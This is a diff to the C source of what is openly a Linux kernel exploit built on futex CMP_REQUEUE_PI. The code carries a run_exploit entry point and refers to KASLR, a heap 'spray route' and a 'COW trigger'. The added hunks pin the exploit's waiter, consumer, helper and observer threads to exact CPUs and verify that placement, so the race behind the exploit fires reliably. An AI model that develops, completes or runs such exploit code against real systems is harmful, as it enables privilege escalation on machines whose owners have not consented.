@@ -5,6 +5,11 @@ uint32_t f_pi_target;
 uint32_t f_pi_chain;
 uint32_t f_pi_sanitize;
 atomic_int route_waiter_core;
+atomic_int route_waiter_pin_ready;
+atomic_int route_waiter_pin_errno;
+atomic_int route_consumer_pin_ready;
+atomic_int route_consumer_pin_errno;
+atomic_int route_placement_error;
 atomic_int waiter_ready;
 atomic_int waiter_waiting;
 atomic_int sanitize_ready;
@@ -28,6 +33,93 @@ int memfd_leak;
 #endif
 #ifndef RMG_DIAG_CONSUMER_CORE
 #define RMG_DIAG_CONSUMER_CORE CONSUMER_CORE
+#endif
+
+#if RMG_DIAG_COW_STRICT_PLACEMENT
+static unsigned long long rmg_diag_strict_affinity_mask64(
+    const cpu_set_t *mask) {
+  unsigned long long bits = 0;
+  for (int cpu = 0; cpu < 64 && cpu < CPU_SETSIZE; cpu++) {
+    if (CPU_ISSET(cpu, mask))
+      bits |= 1ULL << cpu;
+  }
+  return bits;
+}
+
+static int rmg_diag_pin_exact_cpu(int core, const char *role) {
+  cpu_set_t requested, effective;
+  CPU_ZERO(&requested);
+  CPU_ZERO(&effective);
+  if (core < 0 || core >= CPU_SETSIZE) {
+    errno = EINVAL;
+    pr_error("RMG_COW_CPU_PIN role=%s requested=%d invalid_cpu=1\n",
+             role, core);
+    return 0;
+  }
+
+  CPU_SET(core, &requested);
+  errno = 0;
+  int pin_ret = sched_setaffinity(0, sizeof(requested), &requested);
+  int pin_errno = pin_ret == 0 ? 0 : errno;
+  errno = 0;
+  int effective_ret = sched_getaffinity(0, sizeof(effective), &effective);
+  int effective_errno = effective_ret == 0 ? 0 : errno;
+  int current_cpu = sched_getcpu();
+  int effective_count = 0;
+  if (effective_ret == 0) {
+    for (int cpu = 0; cpu < CPU_SETSIZE; cpu++)
+      effective_count += CPU_ISSET(cpu, &effective) ? 1 : 0;
+  }
+  unsigned long long effective_bits = effective_ret == 0
+      ? rmg_diag_strict_affinity_mask64(&effective) : 0;
+  int verified = pin_ret == 0 && effective_ret == 0 &&
+                 effective_count == 1 && CPU_ISSET(core, &effective) &&
+                 current_cpu == core;
+  pr_info("RMG_COW_CPU_PIN role=%s requested=%d set=%d/%d "
+          "effective=%016llx/%d current=%d verified=%d\n",
+          role, core, pin_ret, pin_errno, effective_bits, effective_errno,
+          current_cpu, verified);
+  if (!verified) {
+    errno = pin_errno ? pin_errno :
+            effective_errno ? effective_errno : EINVAL;
+    return 0;
+  }
+  return 1;
+}
+
+static int rmg_diag_widen_and_pin_exact_cpu(int core, const char *role) {
+  cpu_set_t all_cpus, allowed;
+  memset(&all_cpus, 0xff, sizeof(all_cpus));
+  CPU_ZERO(&allowed);
+  errno = 0;
+  int widen_ret = sched_setaffinity(0, sizeof(all_cpus), &all_cpus);
+  int widen_errno = widen_ret == 0 ? 0 : errno;
+  errno = 0;
+  int allowed_ret = widen_ret == 0
+      ? sched_getaffinity(0, sizeof(allowed), &allowed) : -1;
+  int allowed_errno = allowed_ret == 0 ? 0 :
+                      widen_ret != 0 ? widen_errno : errno;
+  unsigned long long allowed_bits = allowed_ret == 0
+      ? rmg_diag_strict_affinity_mask64(&allowed) : 0;
+  int target_allowed = allowed_ret == 0 && core >= 0 &&
+                       core < CPU_SETSIZE && CPU_ISSET(core, &allowed);
+  pr_info("RMG_COW_CPU_WIDEN role=%s result=%d/%d allowed=%016llx/%d "
+          "target=%d target_allowed=%d\n",
+          role, widen_ret, widen_errno, allowed_bits, allowed_errno, core,
+          target_allowed);
+  if (!target_allowed) {
+    errno = allowed_errno ? allowed_errno : ENODEV;
+    return 0;
+  }
+  return rmg_diag_pin_exact_cpu(core, role);
+}
+
+static void rmg_diag_record_placement_error(int error) {
+  if (error <= 0)
+    error = EINVAL;
+  int expected = 0;
+  atomic_compare_exchange_strong(&route_placement_error, &expected, error);
+}
 #endif
 
 #if RMG_DIAG_WAITER_CORE >= 0
@@ -145,6 +237,18 @@ static void ghost_usr1_handler(int sig) {
 
 void *waiter_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
+#if RMG_DIAG_COW_STRICT_PLACEMENT
+  int selected_core = RMG_DIAG_COW_WAITER_CPU;
+  int pin_ok = rmg_diag_pin_exact_cpu(selected_core, "waiter");
+  int pin_errno = pin_ok ? 0 : (errno ? errno : EINVAL);
+  atomic_store(&route_waiter_core, pin_ok ? selected_core : -1);
+  atomic_store(&route_waiter_pin_errno, pin_errno);
+  atomic_store_explicit(&route_waiter_pin_ready, 1, memory_order_release);
+  if (!pin_ok) {
+    rmg_diag_record_placement_error(pin_errno);
+    return NULL;
+  }
+#else
   int requested_core = CORE;
 #if RMG_DIAG_WAITER_CORE >= 0
   requested_core = RMG_DIAG_WAITER_CORE;
@@ -154,6 +258,7 @@ void *waiter_thread(void *arg __attribute__((unused))) {
 #if RMG_DIAG_WAITER_CORE >= 0
   pr_info("RMG_DIAG_WAITER_PIN requested=%d selected=%d sched_cpu=%d\n",
           requested_core, selected_core, sched_getcpu());
+#endif
 #endif
 
   sigset_t blocked;
@@ -324,7 +429,30 @@ void *owner_thread(void *arg __attribute__((unused))) {
 
 void *consumer_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
-#if defined(RMG_DIAG_COW_CONSUMER_AFFINITY) && \
+#if RMG_DIAG_COW_STRICT_PLACEMENT
+  while (!atomic_load_explicit(&route_waiter_pin_ready,
+                               memory_order_acquire)) {
+    usleep(1000);
+  }
+  int waiter_pin_errno = atomic_load(&route_waiter_pin_errno);
+  if (waiter_pin_errno != 0) {
+    atomic_store(&route_consumer_pin_errno, waiter_pin_errno);
+    atomic_store_explicit(&route_consumer_pin_ready, 1,
+                          memory_order_release);
+    rmg_diag_record_placement_error(waiter_pin_errno);
+    return NULL;
+  }
+  int pin_ok = rmg_diag_widen_and_pin_exact_cpu(
+      RMG_DIAG_COW_CONSUMER_CPU, "consumer");
+  int pin_errno = pin_ok ? 0 : (errno ? errno : EINVAL);
+  atomic_store(&route_consumer_pin_errno, pin_errno);
+  atomic_store_explicit(&route_consumer_pin_ready, 1,
+                        memory_order_release);
+  if (!pin_ok) {
+    rmg_diag_record_placement_error(pin_errno);
+    return NULL;
+  }
+#elif defined(RMG_DIAG_COW_CONSUMER_AFFINITY) && \
     RMG_DIAG_COW_CONSUMER_AFFINITY
   /* waiter_thread is created immediately before this thread. Wait until it
    * publishes its actual pinned CPU so the fallback cannot collide with it. */
@@ -432,6 +560,11 @@ void reset_main_route_state(void) {
   f_pi_chain = 0;
   f_pi_sanitize = 0;
   atomic_store(&waiter_ready, 0);
+  atomic_store(&route_waiter_pin_ready, 0);
+  atomic_store(&route_waiter_pin_errno, 0);
+  atomic_store(&route_consumer_pin_ready, 0);
+  atomic_store(&route_consumer_pin_errno, 0);
+  atomic_store(&route_placement_error, 0);
   atomic_store(&waiter_waiting, 0);
   atomic_store(&sanitize_ready, 0);
   atomic_store(&owner_started, 0);
@@ -768,6 +901,30 @@ void run_main_route_threads(void) {
   SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
   SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
 
+#if RMG_DIAG_COW_STRICT_PLACEMENT
+  while (!atomic_load_explicit(&route_waiter_pin_ready,
+                               memory_order_acquire))
+    __asm__ volatile("yield" ::: "memory");
+  int waiter_pin_errno = atomic_load(&route_waiter_pin_errno);
+  if (waiter_pin_errno != 0) {
+    pr_warning("strict COW placement rejected waiter errno=%d; stopping "
+               "before CMP_REQUEUE_PI\n", waiter_pin_errno);
+    rmg_diag_record_placement_error(waiter_pin_errno);
+    return;
+  }
+
+  while (!atomic_load_explicit(&route_consumer_pin_ready,
+                               memory_order_acquire))
+    __asm__ volatile("yield" ::: "memory");
+  int consumer_pin_errno = atomic_load(&route_consumer_pin_errno);
+  if (consumer_pin_errno != 0) {
+    pr_warning("strict COW placement rejected consumer errno=%d; stopping "
+               "before CMP_REQUEUE_PI\n", consumer_pin_errno);
+    rmg_diag_record_placement_error(consumer_pin_errno);
+    return;
+  }
+#endif
+
   while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
     usleep(1000);
   }
@@ -998,6 +1155,32 @@ static int rmg_diag_cpu67_preflight(void) {
       }
     }
   }
+  int strict_roles_allowed = 1;
+  int strict_pin_tests = 1;
+#if RMG_DIAG_COW_STRICT_PLACEMENT
+  const int role_cpus[] = {
+      RMG_DIAG_COW_WAITER_CPU,
+      RMG_DIAG_COW_CONSUMER_CPU,
+      RMG_DIAG_COW_HELPER_CPU,
+      RMG_DIAG_COW_OBSERVER_CPU};
+  const char *const role_names[] = {
+      "preflight_waiter", "preflight_consumer",
+      "preflight_mprotect_helper", "preflight_observer"};
+  for (size_t i = 0; i < sizeof(role_cpus) / sizeof(role_cpus[0]); i++) {
+    int role_allowed = allowed_ret == 0 &&
+                       role_cpus[i] < CPU_SETSIZE &&
+                       CPU_ISSET(role_cpus[i], &allowed);
+    if (!role_allowed) {
+      strict_roles_allowed = 0;
+      strict_pin_tests = 0;
+      pr_warning("RMG_COW_CPU_ROLE_PREFLIGHT role=%s cpu=%d allowed=%d\n",
+                 role_names[i], role_cpus[i], role_allowed);
+      continue;
+    }
+    if (!rmg_diag_pin_exact_cpu(role_cpus[i], role_names[i]))
+      strict_pin_tests = 0;
+  }
+#endif
 
   errno = 0;
   int restore_ret =
@@ -1018,9 +1201,11 @@ static int rmg_diag_cpu67_preflight(void) {
 
   pr_info("RMG_COW_CPU_PREFLIGHT inherited=%016llx allowed=%016llx "
           "allowed_errno=%d cpu6=%d cpu7=%d observer_cpu=%d "
+          "strict_roles=%d strict_pin_tests=%d "
           "restore=%d/%d verify=%d/%d restored=%016llx match=%d\n",
           inherited_bits, allowed_bits, allowed_errno, cpu6_allowed,
-          cpu7_allowed, observer_cpu_available, restore_ret, restore_errno,
+          cpu7_allowed, observer_cpu_available, strict_roles_allowed,
+          strict_pin_tests, restore_ret, restore_errno,
           restored_ret, restored_errno,
           restored_ret == 0 ? rmg_diag_affinity_mask64(&restored) : 0,
           restored_matches);
@@ -1036,6 +1221,13 @@ static int rmg_diag_cpu67_preflight(void) {
                "separate observer CPU; skipping before the exploit route\n");
     return 0;
   }
+#if RMG_DIAG_COW_STRICT_PLACEMENT
+  if (!strict_roles_allowed || !strict_pin_tests) {
+    pr_warning("strict COW CPU preflight could not verify the assigned "
+               "waiter/consumer/helper/observer CPUs; skipping before KASLR\n");
+    return 0;
+  }
+#endif
   return 1;
 }
 #endif
@@ -1069,6 +1261,10 @@ int run_exploit(int argc, char **argv) {
   pr_warning("parent-affinity-only diagnostic stopped before the exploit "
              "route\n");
   return 42;
+#endif
+
+#if RMG_DIAG_COW_STRICT_PLACEMENT
+  SYSCHK(setenv("READINESS_PAUSE", "1", 1));
 #endif
 
   disable_rseq_for_thread();
@@ -1152,6 +1348,17 @@ int run_exploit(int argc, char **argv) {
     return 1;
   }
 
+#if RMG_DIAG_COW_STRICT_PLACEMENT
+  if (!rmg_diag_widen_and_pin_exact_cpu(RMG_DIAG_COW_WAITER_CPU,
+                                         "route_waiter_parent")) {
+    int placement_errno = errno ? errno : EINVAL;
+    pr_warning("strict COW placement could not pin the route thread; "
+               "stopping before CMP_REQUEUE_PI errno=%d\n",
+               placement_errno);
+    return 42;
+  }
+#endif
+
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   if (!page_base) {
     return 1;
@@ -1172,6 +1379,8 @@ int run_exploit(int argc, char **argv) {
   /* This diagnostic must always use the readiness-pause route and must stop
    * before any alternate waiter32 or post-route exploit path. */
   run_main_route_threads();
+#elif RMG_DIAG_COW_STRICT_PLACEMENT
+  run_main_route_threads();
 #else
   /* Use the 32-bit compat socketcall overlay if WAITER32=1 is set,
    * otherwise fall back to the legacy pselect/spray route. */
@@ -1180,6 +1389,15 @@ int run_exploit(int argc, char **argv) {
   else
     run_main_route_threads();
 #endif
+#endif
+
+#if RMG_DIAG_COW_STRICT_PLACEMENT
+  int placement_error = atomic_load(&route_placement_error);
+  if (placement_error != 0) {
+    pr_warning("strict COW placement failed errno=%d; route stopped before "
+               "the COW trigger\n", placement_error);
+    return 42;
+  }
 #endif
 
 #if defined(RMG_DIAG_FDSET_PREFLIGHT_ONLY) && \
